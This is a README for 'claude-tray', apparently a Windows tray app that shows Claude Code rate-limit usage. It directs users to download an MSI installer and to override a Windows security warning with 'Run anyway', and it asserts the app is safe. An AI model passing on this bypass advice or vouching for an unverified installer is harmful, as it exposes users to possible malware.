---
layout: "default"
title: "🖥️ claude-tray - Track your Claude usage on Windows"
description: "Monitor your Claude Code rate limits from the Windows system tray with a native, DPI-aware status icon."
---
# 🖥️ claude-tray - Track your Claude usage on Windows

<a href="https://github.com/sirtapan7-crypto/claude-tray/releases"><img src="https://img.shields.io/badge/Download-Latest%20Version-blue.svg" alt="Download"></a>

This application sits in your Windows system tray. It monitors your Claude Code activity in real time. It tells you your current rate-limit percentage and predicts when you might run out of requests. The icon changes color to red as you approach your limit. You can also view a breakdown of your usage over the last 24 hours.

## 🛠️ System Requirements

- Windows 10 or Windows 11
- .NET Desktop Runtime 8.0 or newer
- An active internet connection 

The application runs smoothly on standard hardware. It consumes very little memory or processor power. You do not need to install complex tools to run this software.

## 📥 Getting Started

Follow these steps to set up the tool on your computer.

1. Visit the [Download Page](https://github.com/sirtapan7-crypto/claude-tray) to get the latest version of the installer.
2. Locate the file named `claude-tray-setup.msi` on the page.
3. Download the file to your computer.
4. Double-click the file to start the installation process.
5. Follow the prompts on your screen.
6. Launch the application from your Start Menu after installation finishes.

If you encounter a security warning, select "More info" and then "Run anyway" to proceed. This happens because the application is a new release from an independent developer.

## 📊 How Usage Monitoring Works

Claude limits the number of requests you send within a specific time frame. This application connects to the same data source that Claude Code uses. It reads your current status and displays the information visually.

- The icon shows your usage level.
- Green indicates low usage.
- Yellow indicates moderate usage.
- Red indicates that you are nearing your limit.

You can hover your mouse over the icon in the tray to see a summary. This summary includes the exact percentage of your remaining quota. 

## 📈 Analyzing Your Data

The tool provides a local dashboard for your activity. Right-click the tray icon and select "View Usage Report". This window shows a chart of your requests over the past 24 hours.

- The X-axis represents the time of day.
- The Y-axis represents the number of requests sent.
- The report helps you identify peak times during your workflow.

This data stays on your local machine. The application does not send your usage history to any external servers.

## ⚙️ Configuration Options

You can change how the application behaves through the settings menu. Right-click the icon and choose "Settings".

- Start with Windows: Enable this to launch the app automatically when you turn on your PC.
- Update Interval: Choose how often the app checks your usage. A shorter interval provides more current data.
- Color Thresholds: Adjust the percentages at which the icon turns yellow or red.

Reset these settings to their default values at any time by clicking the "Restore Defaults" button.

## ❓ Frequently Asked Questions

**Does this app track my chat content?**
No. The application only collects data regarding your request counts and rate limits. It cannot read the text of your conversations.

**Is it safe to run?**
Yes. The source code is open to the public. The app requires no special permissions and writes only a basic configuration file to your user folder.

**What if the icon remains gray?**
A gray icon signifies that the application cannot connect to the service. Check your internet connection or verify that Claude Code is currently active on your system.

**How do I close the application?**
Right-click the tray icon and select "Exit". This stops the background process completely.

## 📝 Troubleshooting

If the application fails to start:

1. Confirm that you have the .NET Desktop Runtime installed. You can download it from the official Microsoft website.
2. Restart your computer to clear any locked settings.
3. Reinstall the application using the installer provided at the download link.

If the usage numbers appear incorrect, restart the application to force a fresh data sync. You can also click "Refresh" inside the usage report window to update the numbers manually.

## 🤝 Support and Feedback

If you find a bug or want to request a feature, head over to the issues section on GitHub. Describe your problem clearly. Include your version of Windows and a brief explanation of what happened. This helps the developer fix issues faster and improve the application for everyone.

The project relies on contributions from the community. You can view the code, suggest improvements, or help with documentation if you have an interest in software development.